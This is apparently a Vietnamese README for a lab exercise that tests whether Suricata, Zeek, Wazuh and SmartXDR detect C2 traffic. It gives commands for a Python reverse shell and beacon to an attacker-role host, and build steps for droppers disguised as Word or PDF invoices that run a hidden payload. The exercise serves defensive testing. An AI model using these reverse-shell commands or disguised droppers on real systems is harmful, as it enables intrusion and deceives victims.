# C2 Outbound Connection - Kiểm thử kết nối C2

## Mô tả

Kịch bản này mô phỏng kỹ thuật **Application Layer Protocol (T1071)** trong khung MITRE ATT&CK. Đây là giai đoạn sau khi mã độc đã xâm nhập thành công vào máy nạn nhân và bắt đầu thiết lập kênh liên lạc bí mật (C2 Channel) ra máy chủ điều khiển.

## MITRE ATT&CK Techniques

| ID        | Technique                      | Script                       |
| --------- | ------------------------------ | ---------------------------- |
| T1071     | Application Layer Protocol     | `c2_reverse_shell.py`        |
| T1204.002 | User Execution: Malicious File | `dropper.py`                 |
| T1036.005 | Masquerading                   | `dropper.py` (fake document) |

## Mục tiêu kiểm thử

- Kiểm chứng khả năng giám sát lưu lượng mạng chiều đi (Outbound Traffic) của hệ thống **Suricata/Zeek**
- Đánh giá khả năng phát hiện hành vi tiến trình kết nối mạng bất thường trên Endpoint của **Wazuh Agent**
- Xác minh khả năng tự động hóa phản ứng của **SmartXDR**

## Cấu hình kiểm thử

| Vai trò              | Máy        | IP               | Công cụ       |
| -------------------- | ---------- | ---------------- | ------------- |
| Attacker (C2 Server) | Kali Linux | `192.168.71.100` | `netcat`      |
| Victim               | Windows 11 | `192.168.85.150` | Python script |

---

## 1. C2 Reverse Shell (`c2_reverse_shell.py`)

### Chế độ Interactive Shell
```bash
python c2_reverse_shell.py --host 192.168.71.100 --port 80
```

### Chế độ Beacon
```bash
python c2_reverse_shell.py --host 192.168.71.100 --port 80 --beacon
```

### Chế độ IOC Trigger (Đọc từ file)
```bash
python c2_reverse_shell.py --ioc-file malicious_ip.txt
```

---

## 2. Fake Document Dropper (`dropper.py`)

Mô phỏng kỹ thuật User Execution - người dùng "vô ý" chạy file .exe giả dạng tài liệu.

### Cách hoạt động
1. Người dùng click vào file `Invoice_2024.exe` (có icon Word)
2. File mở một tài liệu giả (HTML invoice) trong browser
3. Đồng thời, payload C2 chạy ngầm ở background
4. Hệ thống detection ghi nhận kết nối ra ngoài

### Build Dropper
```bash
# Build với icon Word
python build.py dropper

# Build với icon PDF
python build.py dropper-pdf
```

### Output
```
dist/dropper/Invoice_2024.exe      # Fake Word document
dist/dropper-pdf/Report_Q4_2024.exe  # Fake PDF document
```

---

## Tham số CLI

| Tham số         | Mô tả                          | Mặc định           |
| --------------- | ------------------------------ | ------------------ |
| `-H, --host`    | IP của C2 Server               | `192.168.71.100`   |
| `-p, --port`    | Port của C2 Server             | `80`               |
| `--ioc-file`    | File chứa danh sách IP độc hại | `malicious_ip.txt` |
| `--timeout`     | Timeout cho IOC trigger (giây) | `3`                |
| `--delay`       | Delay giữa các kết nối (giây)  | `1.0`              |
| `-v, --verbose` | Hiển thị log chi tiết          | `False`            |

---


## Deploy Zeek
# Zeek
cp c2_detection.zeek /opt/zeek/share/zeek/site/

echo '@load base/frameworks/signatures' >> /opt/zeek/share/zeek/site/local.zeek

echo '@load-sigs ./c2_detection.zeek' >> /opt/zeek/share/zeek/site/local.zeek


zeekctl deploy

## Kết quả mong đợi

### Hệ thống phát hiện:
- **Suricata/Zeek**: Ghi nhận TCP connection từ `192.168.85.150` → `192.168.71.100:80`
- **Wazuh Agent**: Ghi nhận Sysmon Event ID 3 (Network Connection)
- **MISP Integration**: So khớp IP đích với IoC database

### Phản ứng tự động:
- **pfSense**: Chặn IP `192.168.71.100`
- **Wazuh Active Response**: Cô lập máy Windows 11
- **DFIR-IRIS**: Tạo Case mới
- **Telegram**: Gửi thông báo cảnh báo

---

## Cảnh báo

> **⚠️ CHỈ SỬ DỤNG CHO MỤC ĐÍCH KIỂM THỬ BẢO MẬT**
> 
> Script này mô phỏng hành vi mã độc. Việc sử dụng trái phép có thể vi phạm pháp luật.
